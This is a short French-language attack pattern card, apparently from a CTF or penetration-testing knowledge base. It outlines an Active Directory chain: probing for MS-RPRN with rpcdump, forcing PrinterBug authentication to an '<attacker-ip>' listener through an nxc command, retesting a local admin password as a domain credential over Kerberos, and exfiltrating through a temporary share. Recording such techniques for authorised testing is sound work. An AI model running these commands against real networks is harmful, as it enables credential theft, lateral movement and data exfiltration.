---
doc_kind: pattern
title: "Verification rpcdump avant coercition PrinterBug + reutilisation mdp admin local"
category: misc
slug: hades-messenger-printerbug-coercion
created: 2026-10-29
status: active
tags:
  - printerbug
  - ms-rprn
  - coercion
  - password-reuse
  - kerberos-local-admin
chain_summary: "rpcdump confirme la presence de l'interface MS-RPRN avant de lancer une coercition PrinterBug (evite les tentatives aveugles); un mot de passe administrateur local decouvert est systematiquement a retester comme credential de domaine via Kerberos."
---
# Verification rpcdump avant coercition PrinterBug + reutilisation mdp admin local

## Chain Summary

- One-line chain: rpcdump confirme la presence de l'interface MS-RPRN avant de lancer une coercition PrinterBug (evite les tentatives aveugles); un mot de passe administrateur local decouvert est systematiquement a retester comme credential de domaine via Kerberos.
- Typical target shape: Acces reseau a une machine exposant potentiellement le service Spooler; un mot de passe administrateur local connu sur une machine du domaine.

## Preconditions

- Acces reseau a une machine exposant potentiellement le service Spooler; un mot de passe administrateur local connu sur une machine du domaine.

## Cheap Probes

- impacket-rpcdump.py <target> | grep -i MS-RPRN pour confirmer l'interface avant de tenter une coercition.

## Telltale Evidence

- L'interface MS-RPRN apparait dans le dump RPC.

## Escalation Order

1. Confirmer MS-RPRN via rpcdump avant toute tentative de coercition.
2. Lancer la coercition PrinterBug et confirmer le succes.
3. Tester tout mot de passe admin local decouvert comme credential de compte de domaine via Kerberos (pas seulement NTLM/local).
4. Utiliser l'acces obtenu pour exfiltrer via un partage temporaire.

## Common Mistakes

- Lancer une coercition PrinterBug sans verifier au prealable la presence de l'interface RPC via rpcdump (tentative aveugle); ne jamais retester un mot de passe admin local comme credential de domaine.

## Payload Shapes

```text
nxc smb <target> -u <user> -p <pass> -M coerce_plus -o METHOD=PrinterBug LISTENER=<attacker-ip>
```

## Related Writeups

- hades-messenger-printerbug-coercion

## Skill Impact

- Related skill: pwn-triage/AD: ajouter rpcdump systematique avant coercition PrinterBug, et retest Kerberos de tout mot de passe admin local decouvert.
- Rule to add or update: (backlog only for now; promote if this pattern repeats)
